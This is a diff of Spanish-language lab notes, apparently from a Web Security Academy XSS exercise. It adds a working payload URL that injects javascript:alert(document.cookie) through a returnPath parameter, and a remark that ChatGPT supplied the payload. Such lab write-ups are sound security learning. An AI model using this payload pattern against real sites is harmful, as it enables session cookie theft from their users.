@@ -1469,7 +1469,7 @@
 
 <details>
 
-<summary>🛠️ SCRIPT DE EXPLOIT Y PAYLOADS ❌</summary>
+<summary>🛠️ SCRIPT DE EXPLOIT Y PAYLOADS ✔️</summary>
 
 ### SCRIPT DE EXPLOIT Y PAYLOADS
 
@@ -1564,13 +1564,17 @@
     ```
 
     * CONCLUSION:
-*   [ ] COMPLETAR...👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)
+*   [x] CHAT GPT👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)
 
     ```python
-    # Espacio para fragmento de código Python -->
+    URL CON EL PAYLOAD  (javascript:alert(document.cookie)) QUE FUNCIONO: 
+
+
+    https://0aac007e04fc89f280813502004b0007.web-security-academy.net/feedback? 
+    returnPath=javascript:alert(document.cookie)
     ```
 
-    * CONCLUSION:
+    * CONCLUSION: CONSULTANDO A GPT SOBRE UN METODO PARA QUE SE EJECUTE UN ALERT CON LAS DOCUMENT.COOKIES NOS DEVOLVIO ESTE CODIGO SIMPLE EL CUAL FUNCIOINO EN EL BROWSER TAMBIEN.
 *   [ ] COMPLETAR...👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)
 
     ```python
